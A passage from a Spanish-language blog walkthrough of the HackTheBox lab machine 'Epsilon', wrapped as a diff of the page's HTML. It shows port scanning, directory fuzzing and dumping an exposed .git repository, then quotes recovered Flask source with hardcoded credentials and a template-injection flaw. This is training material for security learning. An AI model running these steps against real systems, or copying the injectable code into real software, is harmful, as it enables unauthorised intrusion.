@@ -1,0 +1,1178 @@
+<!DOCTYPE html>
+<html lang="en"><head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1"><!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>HackTheBox - Epsilon (medium) | MiguelRega7 - blog</title>
+<meta name="generator" content="Jekyll v4.3.2" />
+<meta property="og:title" content="HackTheBox - Epsilon (medium)" />
+<meta name="author" content="MiguelRega7" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Posts sobre resolución de CTFs y ciberseguridad." />
+<meta property="og:description" content="Posts sobre resolución de CTFs y ciberseguridad." />
+<link rel="canonical" href="http://localhost:4000/hackthebox/machines/medium/2024/07/04/epsilon.html" />
+<meta property="og:url" content="http://localhost:4000/hackthebox/machines/medium/2024/07/04/epsilon.html" />
+<meta property="og:site_name" content="MiguelRega7 - blog" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2024-07-04T00:00:00-06:00" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="HackTheBox - Epsilon (medium)" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"MiguelRega7"},"dateModified":"2024-07-04T00:00:00-06:00","datePublished":"2024-07-04T00:00:00-06:00","description":"Posts sobre resolución de CTFs y ciberseguridad.","headline":"HackTheBox - Epsilon (medium)","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/hackthebox/machines/medium/2024/07/04/epsilon.html"},"url":"http://localhost:4000/hackthebox/machines/medium/2024/07/04/epsilon.html"}</script>
+<!-- End Jekyll SEO tag -->
+<link rel="stylesheet" href="/assets/css/style.css"><link type="application/atom+xml" rel="alternate" href="http://localhost:4000/feed.xml" title="MiguelRega7 - blog" />
+</head>
+<body><header class="site-header">
+
+  <div class="wrapper"><a class="site-title" rel="author" href="/">MiguelRega7 - blog</a><nav class="site-nav">
+        <input type="checkbox" id="nav-trigger" class="nav-trigger" />
+        <label for="nav-trigger">
+          <span class="menu-icon">
+            <svg viewBox="0 0 18 15" width="18px" height="15px">
+              <path d="M18,1.484c0,0.82-0.665,1.484-1.484,1.484H1.484C0.665,2.969,0,2.304,0,1.484l0,0C0,0.665,0.665,0,1.484,0 h15.032C17.335,0,18,0.665,18,1.484L18,1.484z M18,7.516C18,8.335,17.335,9,16.516,9H1.484C0.665,9,0,8.335,0,7.516l0,0 c0-0.82,0.665-1.484,1.484-1.484h15.032C17.335,6.031,18,6.696,18,7.516L18,7.516z M18,13.516C18,14.335,17.335,15,16.516,15H1.484 C0.665,15,0,14.335,0,13.516l0,0c0-0.82,0.665-1.483,1.484-1.483h15.032C17.335,12.031,18,12.695,18,13.516L18,13.516z"/>
+            </svg>
+          </span>
+        </label>
+
+        <div class="trigger"><a class="page-link" href="/about/">About</a></div>
+      </nav></div>
+</header>
+<main class="page-content" aria-label="Content">
+      <div class="wrapper">
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+
+  <header class="post-header">
+    <h1 class="post-title p-name" itemprop="name headline">HackTheBox - Epsilon (medium)</h1>
+    <p class="post-meta"><time class="dt-published" datetime="2024-07-04T00:00:00-06:00" itemprop="datePublished">
+        Jul 4, 2024
+      </time></p>
+  </header>
+
+  <div class="post-content e-content" itemprop="articleBody">
+    <p align="center">
+<img src="https://labs.hackthebox.com/storage/avatars/16ed7466c1f37757e15bd7e37668d243.png" />
+</p>
+
+<ul>
+  <li>Epsilon is a medium difficulty Linux machine which exposes a Git repository on the webserver. AWS credentials are leaked in Git commits, which allows downloading the AWS Lambda function code. Secret key found in the source code can be used to forge a cookie to gain access to the web application. Foothold is obtained by exploiting the Server Side Template Injection vulnerability in the application feature. Abusing the tar symlink in a cronjob gives root access.</li>
+</ul>
+
+<h2 id="portscan">PortScan</h2>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ <span class="nb">sudo </span>nmap <span class="nt">-sCV</span> <span class="nt">-p22</span>,80,5000 10.10.11.134 <span class="nt">-oN</span> targeted
+Starting Nmap 7.94SVN <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2024-07-04 18:13 CST
+Nmap scan report <span class="k">for </span>10.10.11.134
+Host is up <span class="o">(</span>0.10s latency<span class="o">)</span><span class="nb">.</span>
+
+PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
+| ssh-hostkey:
+|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae <span class="o">(</span>RSA<span class="o">)</span>
+|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f <span class="o">(</span>ECDSA<span class="o">)</span>
+|_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb <span class="o">(</span>ED25519<span class="o">)</span>
+80/tcp   open  http    Apache httpd 2.4.41
+|_http-title: 403 Forbidden
+|_http-server-header: Apache/2.4.41 <span class="o">(</span>Ubuntu<span class="o">)</span>
+| http-git:
+|   10.10.11.134:80/.git/
+|     Git repository found!
+|     Repository description: Unnamed repository<span class="p">;</span> edit this file <span class="s1">'description'</span> to name the...
+|_    Last commit message: Updating Tracking API  <span class="c"># Please enter the commit message for...</span>
+5000/tcp open  http    Werkzeug httpd 2.0.2 <span class="o">(</span>Python 3.8.10<span class="o">)</span>
+|_http-title: Costume Shop
+|_http-server-header: Werkzeug/2.0.2 Python/3.8.10
+Service Info: Host: 127.0.1.1<span class="p">;</span> OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel
+</code></pre></div></div>
+
+<h2 id="enumeración">Enumeración</h2>
+
+<ul>
+  <li>En la pagina web principal obtenemos un código de estado <code class="language-plaintext highlighter-rouge">403</code>.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ curl <span class="nt">-s</span> http://10.10.11.134
+&lt;<span class="o">!</span>DOCTYPE HTML PUBLIC <span class="s2">"-//IETF//DTD HTML 2.0//EN"</span><span class="o">&gt;</span>
+&lt;html&gt;&lt;<span class="nb">head</span><span class="o">&gt;</span>
+&lt;title&gt;403 Forbidden&lt;/title&gt;
+&lt;/head&gt;&lt;body&gt;
+&lt;h1&gt;Forbidden&lt;/h1&gt;
+&lt;p&gt;You don<span class="s1">'t have permission to access this resource.&lt;/p&gt;
+&lt;hr&gt;
+&lt;address&gt;Apache/2.4.41 (Ubuntu) Server at 10.10.11.134 Port 80&lt;/address&gt;
+&lt;/body&gt;&lt;/html&gt;
+</span></code></pre></div></div>
+
+<ul>
+  <li>Si lo hacemos al puerto 5000 si nos responde.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ curl <span class="nt">-s</span> http://10.10.11.134:5000
+
+
+&lt;<span class="o">!</span>DOCTYPE html&gt;
+&lt;html <span class="nv">lang</span><span class="o">=</span><span class="s2">"en"</span> <span class="o">&gt;</span>
+
+&lt;<span class="nb">head</span><span class="o">&gt;</span>
+
+  &lt;meta <span class="nv">charset</span><span class="o">=</span><span class="s2">"UTF-8"</span><span class="o">&gt;</span>
+
+  &lt;title&gt;Costume Shop&lt;/title&gt;
+</code></pre></div></div>
+
+<ul>
+  <li>Como vemos no tenemos acceso.</li>
+</ul>
+
+<p align="center">
+<img src="/assets/hackthebox/img/machines/medium/epsilon/1.png" />
+</p>
+
+<ul>
+  <li>En el puerto 5000 si podemos ver la web.</li>
+</ul>
+
+<p align="center">
+<img src="/assets/hackthebox/img/machines/medium/epsilon/2.png" />
+</p>
+
+<ul>
+  <li>Después de probar varias <code class="language-plaintext highlighter-rouge">querys</code> para ver si es vulnerable a una <code class="language-plaintext highlighter-rouge">SQL Injection</code> no tuve éxito, <code class="language-plaintext highlighter-rouge">Nmap</code> nos reporto un <code class="language-plaintext highlighter-rouge">.git</code> pero antes vamos a hacer <code class="language-plaintext highlighter-rouge">fuzzing</code> para ver si encontramos algo.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ feroxbuster <span class="nt">-u</span> http://10.10.11.134:5000
+
+ ___  ___  __   __     __      __         __   ___
+|__  |__  |__<span class="o">)</span> |__<span class="o">)</span> | /  <span class="sb">`</span>    /  <span class="se">\ \_</span>/ | |  <span class="se">\ </span>|__
+|    |___ |  <span class="se">\ </span>|  <span class="se">\ </span>| <span class="se">\_</span>_,    <span class="se">\_</span>_/ / <span class="se">\ </span>| |__/ |___
+by Ben <span class="s2">"epi"</span> Risher 🤓                 ver: 2.10.3
+───────────────────────────┬──────────────────────
+ 🎯  Target Url            │ http://10.10.11.134:5000
+ 🚀  Threads               │ 50
+ 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
+ 👌  Status Codes          │ All Status Codes!
+ 💥  Timeout <span class="o">(</span>secs<span class="o">)</span>        │ 7
+ 🦡  User-Agent            │ feroxbuster/2.10.3
+ 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
+ 🔎  Extract Links         │ <span class="nb">true</span>
+ 🏁  HTTP methods          │ <span class="o">[</span>GET]
+ 🔃  Recursion Depth       │ 4
+ 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
+───────────────────────────┴──────────────────────
+ 🏁  Press <span class="o">[</span>ENTER] to use the Scan Management Menu™
+──────────────────────────────────────────────────
+404      GET        4l       34w      232c Auto-filtering found 404-like response and created new filter<span class="p">;</span> toggle off with <span class="nt">--dont-filter</span>
+302      GET        4l       24w      208c http://10.10.11.134:5000/home <span class="o">=&gt;</span> http://10.10.11.134:5000/
+200      GET      545l     2833w   217381c http://10.10.11.134:5000/static/img/costume.jpg
+200      GET      205l      358w     3550c http://10.10.11.134:5000/
+302      GET        4l       24w      208c http://10.10.11.134:5000/order <span class="o">=&gt;</span> http://10.10.11.134:5000/
+200      GET      234l      454w     4288c http://10.10.11.134:5000/track
+200      GET      565l     3002w   320823c http://10.10.11.134:5000/static/img/ico.png
+<span class="o">[</span><span class="c">####################] - 3m     30006/30006   0s      found:6       errors:3</span>
+<span class="o">[</span><span class="c">####################] - 3m     30000/30000   187/s   http://10.10.11.134:5000/ </span>
+</code></pre></div></div>
+
+<ul>
+  <li>
+    <p>Las rutas order y track son interesantes así que vamos a ir a track.</p>
+  </li>
+  <li>
+    <p>Estamos como el Admin.</p>
+  </li>
+</ul>
+
+<p align="center">
+<img src="/assets/hackthebox/img/machines/medium/epsilon/3.png" />
+</p>
+
+<ul>
+  <li>Si ponemos cualquier numero en el campo ID nos redirige al panel de login eso quiere decir que debemos estar logeados correctamente para acceder.</li>
+</ul>
+
+<h2 id="git-enumeration">Git Enumeration</h2>
+
+<ul>
+  <li>Como vimos el <code class="language-plaintext highlighter-rouge">.git</code> expuesto vamos a enumerarlo <a href="https://pypi.org/project/git-dumper/">https://pypi.org/project/git-dumper/</a>.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ git-dumper http://10.10.11.134/.git <span class="nb">.</span>
+<span class="o">[</span>-] Testing http://10.10.11.134/.git/HEAD <span class="o">[</span>200]
+<span class="o">[</span>-] Testing http://10.10.11.134/.git/ <span class="o">[</span>403]
+<span class="o">[</span>-] Fetching common files
+<span class="o">[</span>-] Fetching http://10.10.11.134/.gitignore <span class="o">[</span>404]
+<span class="o">[</span>-] http://10.10.11.134/.gitignore responded with status code 404
+<span class="o">[</span>-] Fetching http://10.10.11.134/.git/description <span class="o">[</span>200]
+<span class="o">[</span>-] Fetching http://10.10.11.134/.git/hooks/commit-msg.sample <span class="o">[</span>200]
+<span class="o">[</span>-] Fetching http://10.10.11.134/.git/hooks/applypatch-msg.sample <span class="o">[</span>200]
+<span class="o">[</span>-] Fetching http://10.10.11.134/.git/COMMIT_EDITMSG <span class="o">[</span>200]
+<span class="o">[</span>-] Fetching http://10.10.11.134/.git/hooks/post-commit.sample <span class="o">[</span>404]
+<span class="o">[</span>-] http://10.10.11.134/.git/hooks/post-commit.sample responded with status code 404
+<span class="o">[</span>-] Fetching http://10.10.11.134/.git/hooks/post-receive.sample <span class="o">[</span>404]
+<span class="o">[</span>-] http://10.10.11.134/.git/hooks/post-receive.sample responded with status code 404
+<span class="o">[</span>-] Fetching http://10.10.11.134/.git/hooks/pre-rebase.sample <span class="o">[</span>200]
+<span class="o">[</span>-] Fetching http://10.10.11.134/.git/hooks/update.sample <span class="o">[</span>200]
+<span class="o">[</span>-] Fetching http://10.10.11.134/.git/hooks/prepare-commit-msg.sample <span class="o">[</span>200]
+<span class="o">[</span>-] Fetching http://10.10.11.134/.git/hooks/post-update.sample <span class="o">[</span>200]
+<span class="o">[</span>-] Fetching http://10.10.11.134/.git/hooks/pre-receive.sample <span class="o">[</span>200]
+<span class="o">[</span>-] Fetching http://10.10.11.134/.git/hooks/pre-applypatch.sample <span class="o">[</span>200]
+<span class="o">[</span>-] Fetching http://10.10.11.134/.git/objects/info/packs <span class="o">[</span>404]
+<span class="o">[</span>-] http://10.10.11.134/.git/objects/info/packs responded with status code 404
+<span class="o">[</span>-] Fetching http://10.10.11.134/.git/hooks/pre-commit.sample <span class="o">[</span>200]
+<span class="o">[</span>-] Fetching http://10.10.11.134/.git/hooks/pre-push.sample <span class="o">[</span>200]
+<span class="o">[</span>-] Fetching http://10.10.11.134/.git/info/exclude <span class="o">[</span>200]
+<span class="o">[</span>-] Fetching http://10.10.11.134/.git/index <span class="o">[</span>200]
+<span class="o">[</span>-] Finding refs/
+<span class="o">[</span>-] Fetching http://10.10.11.134/.git/FETCH_HEAD <span class="o">[</span>404]
+<span class="o">[</span>-] http://10.10.11.134/.git/FETCH_HEAD responded with status code 404
+<span class="o">[</span>-] Fetching http://10.10.11.134/.git/ORIG_HEAD <span class="o">[</span>200]
+<span class="o">[</span>-] Fetching http://10.10.11.134/.git/HEAD <span class="o">[</span>200]
+<span class="o">[</span>-] Fetching http://10.10.11.134/.git/info/refs <span class="o">[</span>404]
+<span class="o">[</span>-] http://10.10.11.134/.git/info/refs responded with status code 404
+<span class="o">[</span>-] Fetching http://10.10.11.134/.git/config <span class="o">[</span>200]
+<span class="o">[</span>-] Fetching http://10.10.11.134/.git/logs/refs/heads/master <span class="o">[</span>200]
+<span class="o">[</span>-] Fetching http://10.10.11.134/.git/logs/refs/remotes/origin/HEAD <span class="o">[</span>404]
+<span class="o">[</span>-] http://10.10.11.134/.git/logs/refs/remotes/origin/HEAD responded with status code 404
+<span class="o">[</span>-] Fetching http://10.10.11.134/.git/logs/HEAD <span class="o">[</span>200]
+<span class="o">[</span>-] Fetching http://10.10.11.134/.git/logs/refs/stash <span class="o">[</span>404]
+<span class="o">[</span>-] http://10.10.11.134/.git/logs/refs/stash responded with status code 404
+<span class="o">[</span>-] Fetching http://10.10.11.134/.git/packed-refs <span class="o">[</span>404]
+<span class="o">[</span>-] http://10.10.11.134/.git/packed-refs responded with status code 404
+<span class="o">[</span>-] Fetching http://10.10.11.134/.git/refs/heads/master <span class="o">[</span>200]
+<span class="o">[</span>-] Fetching http://10.10.11.134/.git/refs/remotes/origin/HEAD <span class="o">[</span>404]
+<span class="o">[</span>-] http://10.10.11.134/.git/refs/remotes/origin/HEAD responded with status code 404
+<span class="o">[</span>-] Fetching http://10.10.11.134/.git/refs/remotes/origin/master <span class="o">[</span>404]
+<span class="o">[</span>-] Fetching http://10.10.11.134/.git/refs/stash <span class="o">[</span>404]
+<span class="o">[</span>-] http://10.10.11.134/.git/refs/stash responded with status code 404
+<span class="o">[</span>-] http://10.10.11.134/.git/refs/remotes/origin/master responded with status code 404
+<span class="o">[</span>-] Fetching http://10.10.11.134/.git/refs/wip/wtree/refs/heads/master <span class="o">[</span>404]
+<span class="o">[</span>-] http://10.10.11.134/.git/refs/wip/wtree/refs/heads/master responded with status code 404
+<span class="o">[</span>-] Fetching http://10.10.11.134/.git/refs/wip/index/refs/heads/master <span class="o">[</span>404]
+<span class="o">[</span>-] http://10.10.11.134/.git/refs/wip/index/refs/heads/master responded with status code 404
+<span class="o">[</span>-] Fetching http://10.10.11.134/.git/logs/refs/remotes/origin/master <span class="o">[</span>404]
+<span class="o">[</span>-] http://10.10.11.134/.git/logs/refs/remotes/origin/master responded with status code 404
+<span class="o">[</span>-] Finding packs
+<span class="o">[</span>-] Finding objects
+<span class="o">[</span>-] Fetching objects
+<span class="o">[</span>-] Fetching http://10.10.11.134/.git/objects/c6/22771686bd74c16ece91193d29f85b5f9ffa91 <span class="o">[</span>200]
+<span class="o">[</span>-] Fetching http://10.10.11.134/.git/objects/b1/0dd06d56ac760efbbb5d254ea43bf9beb56d2d <span class="o">[</span>200]
+<span class="o">[</span>-] Fetching http://10.10.11.134/.git/objects/df/dfa17ca5701b1dca5069b6c3f705a038f4361e <span class="o">[</span>200]
+<span class="o">[</span>-] Fetching http://10.10.11.134/.git/objects/c5/1441640fd25e9fba42725147595b5918eba0f1 <span class="o">[</span>200]
+<span class="o">[</span>-] Fetching http://10.10.11.134/.git/objects/5c/52105750831385d4756111e1103957ac599d02 <span class="o">[</span>200]
+<span class="o">[</span>-] Fetching http://10.10.11.134/.git/objects/8d/3b52e153c7d5380b183bbbb51f5d4020944630 <span class="o">[</span>200]
+<span class="o">[</span>-] Fetching http://10.10.11.134/.git/objects/ce/401ccecf421ff19bf43fafe8a60a0d0f0682d0 <span class="o">[</span>200]
+<span class="o">[</span>-] Fetching http://10.10.11.134/.git/objects/00/00000000000000000000000000000000000000 <span class="o">[</span>404]
+<span class="o">[</span>-] Fetching http://10.10.11.134/.git/objects/7c/f92a7a09e523c1c667d13847c9ba22464412f3 <span class="o">[</span>200]
+<span class="o">[</span>-] http://10.10.11.134/.git/objects/00/00000000000000000000000000000000000000 responded with status code 404
+<span class="o">[</span>-] Fetching http://10.10.11.134/.git/objects/65/b80f62da28254f67f0bea392057fd7d2330e2d <span class="o">[</span>200]
+<span class="o">[</span>-] Fetching http://10.10.11.134/.git/objects/cf/489a3776d2bf87ac32de4579e852a4dc116ce8 <span class="o">[</span>200]
+<span class="o">[</span>-] Fetching http://10.10.11.134/.git/objects/ab/07f7cdc7f410b8c8f848ee5674ec550ecb61ca <span class="o">[</span>200]
+<span class="o">[</span>-] Fetching http://10.10.11.134/.git/objects/b5/f4c99c772eeb629e53d284275458d75ed9a010 <span class="o">[</span>200]
+<span class="o">[</span>-] Fetching http://10.10.11.134/.git/objects/54/5f6fe2204336c1ea21720cbaa47572eb566e34 <span class="o">[</span>200]
+<span class="o">[</span>-] Fetching http://10.10.11.134/.git/objects/fe/d7ab97cf361914f688f0e4f2d3adfafd1d7dca <span class="o">[</span>200]
+<span class="o">[</span>-] Running git checkout <span class="nb">.</span>
+</code></pre></div></div>
+
+<ul>
+  <li>Existe otra herramienta que se llama GitHack <a href="https://github.com/lijiejie/GitHack/tree/master">https://github.com/lijiejie/GitHack/tree/master</a>.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ pip3 <span class="nb">install </span>GitHack
+Defaulting to user installation because normal site-packages is not writeable
+Collecting GitHack
+  Downloading githack-0.0.4.post1-py3-none-any.whl.metadata <span class="o">(</span>2.0 kB<span class="o">)</span>
+Downloading githack-0.0.4.post1-py3-none-any.whl <span class="o">(</span>54 kB<span class="o">)</span>
+   ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 54.2/54.2 kB 579.0 kB/s eta 0:00:00
+Installing collected packages: GitHack
+Successfully installed GitHack-0.0.4.post1
+</code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ githack http://10.10.11.134/.git/
+</code></pre></div></div>
+
+<ul>
+  <li>Tenemos el proyecto.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ <span class="nb">ls</span> <span class="nt">-la</span>
+total 20
+drwxr-xr-x 3 miguel miguel 4096 Jul  4 18:31 <span class="nb">.</span>
+drwxr-xr-x 6 miguel miguel 4096 Jul  4 18:09 ..
+drwxr-xr-x 7 miguel miguel 4096 Jul  4 18:31 .git
+<span class="nt">-rw-r--r--</span> 1 miguel miguel 1670 Jul  4 18:31 server.py
+<span class="nt">-rw-r--r--</span> 1 miguel miguel 1099 Jul  4 18:31 track_api_CR_148.py
+</code></pre></div></div>
+
+<ul>
+  <li>Este es el código en Python3 donde corre el puerto <code class="language-plaintext highlighter-rouge">5000</code>.</li>
+</ul>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/python3
+</span>
+<span class="kn">import</span> <span class="n">jwt</span>
+<span class="kn">from</span> <span class="n">flask</span> <span class="kn">import</span> <span class="o">*</span>
+
+<span class="n">app</span> <span class="o">=</span> <span class="nc">Flask</span><span class="p">(</span><span class="n">__name__</span><span class="p">)</span>
+<span class="n">secret</span> <span class="o">=</span> <span class="sh">'</span><span class="s">&lt;secret_key&gt;</span><span class="sh">'</span>
+
+<span class="k">def</span> <span class="nf">verify_jwt</span><span class="p">(</span><span class="n">token</span><span class="p">,</span><span class="n">key</span><span class="p">):</span>
+	<span class="k">try</span><span class="p">:</span>
+		<span class="n">username</span><span class="o">=</span><span class="n">jwt</span><span class="p">.</span><span class="nf">decode</span><span class="p">(</span><span class="n">token</span><span class="p">,</span><span class="n">key</span><span class="p">,</span><span class="n">algorithms</span><span class="o">=</span><span class="p">[</span><span class="sh">'</span><span class="s">HS256</span><span class="sh">'</span><span class="p">,])[</span><span class="sh">'</span><span class="s">username</span><span class="sh">'</span><span class="p">]</span>
+		<span class="k">if</span> <span class="n">username</span><span class="p">:</span>
+			<span class="k">return</span> <span class="bp">True</span>
+		<span class="k">else</span><span class="p">:</span>
+			<span class="k">return</span> <span class="bp">False</span>
+	<span class="k">except</span><span class="p">:</span>
+		<span class="k">return</span> <span class="bp">False</span>
+
+<span class="nd">@app.route</span><span class="p">(</span><span class="sh">"</span><span class="s">/</span><span class="sh">"</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="sh">"</span><span class="s">GET</span><span class="sh">"</span><span class="p">,</span><span class="sh">"</span><span class="s">POST</span><span class="sh">"</span><span class="p">])</span>
+<span class="k">def</span> <span class="nf">index</span><span class="p">():</span>
+	<span class="k">if</span> <span class="n">request</span><span class="p">.</span><span class="n">method</span><span class="o">==</span><span class="sh">"</span><span class="s">POST</span><span class="sh">"</span><span class="p">:</span>
+		<span class="k">if</span> <span class="n">request</span><span class="p">.</span><span class="n">form</span><span class="p">[</span><span class="sh">'</span><span class="s">username</span><span class="sh">'</span><span class="p">]</span><span class="o">==</span><span class="sh">"</span><span class="s">admin</span><span class="sh">"</span> <span class="ow">and</span> <span class="n">request</span><span class="p">.</span><span class="n">form</span><span class="p">[</span><span class="sh">'</span><span class="s">password</span><span class="sh">'</span><span class="p">]</span><span class="o">==</span><span class="sh">"</span><span class="s">admin</span><span class="sh">"</span><span class="p">:</span>
+			<span class="n">res</span> <span class="o">=</span> <span class="nf">make_response</span><span class="p">()</span>
+			<span class="n">username</span><span class="o">=</span><span class="n">request</span><span class="p">.</span><span class="n">form</span><span class="p">[</span><span class="sh">'</span><span class="s">username</span><span class="sh">'</span><span class="p">]</span>
+			<span class="n">token</span><span class="o">=</span><span class="n">jwt</span><span class="p">.</span><span class="nf">encode</span><span class="p">({</span><span class="sh">"</span><span class="s">username</span><span class="sh">"</span><span class="p">:</span><span class="sh">"</span><span class="s">admin</span><span class="sh">"</span><span class="p">},</span><span class="n">secret</span><span class="p">,</span><span class="n">algorithm</span><span class="o">=</span><span class="sh">"</span><span class="s">HS256</span><span class="sh">"</span><span class="p">)</span>
+			<span class="n">res</span><span class="p">.</span><span class="nf">set_cookie</span><span class="p">(</span><span class="sh">"</span><span class="s">auth</span><span class="sh">"</span><span class="p">,</span><span class="n">token</span><span class="p">)</span>
+			<span class="n">res</span><span class="p">.</span><span class="n">headers</span><span class="p">[</span><span class="sh">'</span><span class="s">location</span><span class="sh">'</span><span class="p">]</span><span class="o">=</span><span class="sh">'</span><span class="s">/home</span><span class="sh">'</span>
+			<span class="k">return</span> <span class="n">res</span><span class="p">,</span><span class="mi">302</span>
+		<span class="k">else</span><span class="p">:</span>
+			<span class="k">return</span> <span class="nf">render_template</span><span class="p">(</span><span class="sh">'</span><span class="s">index.html</span><span class="sh">'</span><span class="p">)</span>
+	<span class="k">else</span><span class="p">:</span>
+		<span class="k">return</span> <span class="nf">render_template</span><span class="p">(</span><span class="sh">'</span><span class="s">index.html</span><span class="sh">'</span><span class="p">)</span>
+
+<span class="nd">@app.route</span><span class="p">(</span><span class="sh">"</span><span class="s">/home</span><span class="sh">"</span><span class="p">)</span>
+<span class="k">def</span> <span class="nf">home</span><span class="p">():</span>
+	<span class="k">if</span> <span class="nf">verify_jwt</span><span class="p">(</span><span class="n">request</span><span class="p">.</span><span class="n">cookies</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="sh">'</span><span class="s">auth</span><span class="sh">'</span><span class="p">),</span><span class="n">secret</span><span class="p">):</span>
+		<span class="k">return</span> <span class="nf">render_template</span><span class="p">(</span><span class="sh">'</span><span class="s">home.html</span><span class="sh">'</span><span class="p">)</span>
+	<span class="k">else</span><span class="p">:</span>
+		<span class="k">return</span> <span class="nf">redirect</span><span class="p">(</span><span class="sh">'</span><span class="s">/</span><span class="sh">'</span><span class="p">,</span><span class="n">code</span><span class="o">=</span><span class="mi">302</span><span class="p">)</span>
+
+<span class="nd">@app.route</span><span class="p">(</span><span class="sh">"</span><span class="s">/track</span><span class="sh">"</span><span class="p">,</span><span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="sh">"</span><span class="s">GET</span><span class="sh">"</span><span class="p">,</span><span class="sh">"</span><span class="s">POST</span><span class="sh">"</span><span class="p">])</span>
+<span class="k">def</span> <span class="nf">track</span><span class="p">():</span>
+	<span class="k">if</span> <span class="n">request</span><span class="p">.</span><span class="n">method</span><span class="o">==</span><span class="sh">"</span><span class="s">POST</span><span class="sh">"</span><span class="p">:</span>
+		<span class="k">if</span> <span class="nf">verify_jwt</span><span class="p">(</span><span class="n">request</span><span class="p">.</span><span class="n">cookies</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="sh">'</span><span class="s">auth</span><span class="sh">'</span><span class="p">),</span><span class="n">secret</span><span class="p">):</span>
+			<span class="k">return</span> <span class="nf">render_template</span><span class="p">(</span><span class="sh">'</span><span class="s">track.html</span><span class="sh">'</span><span class="p">,</span><span class="n">message</span><span class="o">=</span><span class="bp">True</span><span class="p">)</span>
+		<span class="k">else</span><span class="p">:</span>
+			<span class="k">return</span> <span class="nf">redirect</span><span class="p">(</span><span class="sh">'</span><span class="s">/</span><span class="sh">'</span><span class="p">,</span><span class="n">code</span><span class="o">=</span><span class="mi">302</span><span class="p">)</span>
+	<span class="k">else</span><span class="p">:</span>
+		<span class="k">return</span> <span class="nf">render_template</span><span class="p">(</span><span class="sh">'</span><span class="s">track.html</span><span class="sh">'</span><span class="p">)</span>
+
+<span class="nd">@app.route</span><span class="p">(</span><span class="sh">'</span><span class="s">/order</span><span class="sh">'</span><span class="p">,</span><span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="sh">"</span><span class="s">GET</span><span class="sh">"</span><span class="p">,</span><span class="sh">"</span><span class="s">POST</span><span class="sh">"</span><span class="p">])</span>
+<span class="k">def</span> <span class="nf">order</span><span class="p">():</span>
+	<span class="k">if</span> <span class="nf">verify_jwt</span><span class="p">(</span><span class="n">request</span><span class="p">.</span><span class="n">cookies</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="sh">'</span><span class="s">auth</span><span class="sh">'</span><span class="p">),</span><span class="n">secret</span><span class="p">):</span>
+		<span class="k">if</span> <span class="n">request</span><span class="p">.</span><span class="n">method</span><span class="o">==</span><span class="sh">"</span><span class="s">POST</span><span class="sh">"</span><span class="p">:</span>
+			<span class="n">costume</span><span class="o">=</span><span class="n">request</span><span class="p">.</span><span class="n">form</span><span class="p">[</span><span class="sh">"</span><span class="s">costume</span><span class="sh">"</span><span class="p">]</span>
+			<span class="n">message</span> <span class="o">=</span> <span class="sh">'''</span><span class="s">
+			Your order of </span><span class="sh">"</span><span class="s">{}</span><span class="sh">"</span><span class="s"> has been placed successfully.
+			</span><span class="sh">'''</span><span class="p">.</span><span class="nf">format</span><span class="p">(</span><span class="n">costume</span><span class="p">)</span>
+			<span class="n">tmpl</span><span class="o">=</span><span class="nf">render_template_string</span><span class="p">(</span><span class="n">message</span><span class="p">,</span><span class="n">costume</span><span class="o">=</span><span class="n">costume</span><span class="p">)</span>
+			<span class="k">return</span> <span class="nf">render_template</span><span class="p">(</span><span class="sh">'</span><span class="s">order.html</span><span class="sh">'</span><span class="p">,</span><span class="n">message</span><span class="o">=</span><span class="n">tmpl</span><span class="p">)</span>
+		<span class="k">else</span><span class="p">:</span>
+			<span class="k">return</span> <span class="nf">render_template</span><span class="p">(</span><span class="sh">'</span><span class="s">order.html</span><span class="sh">'</span><span class="p">)</span>
+	<span class="k">else</span><span class="p">:</span>
+		<span class="k">return</span> <span class="nf">redirect</span><span class="p">(</span><span class="sh">'</span><span class="s">/</span><span class="sh">'</span><span class="p">,</span><span class="n">code</span><span class="o">=</span><span class="mi">302</span><span class="p">)</span>
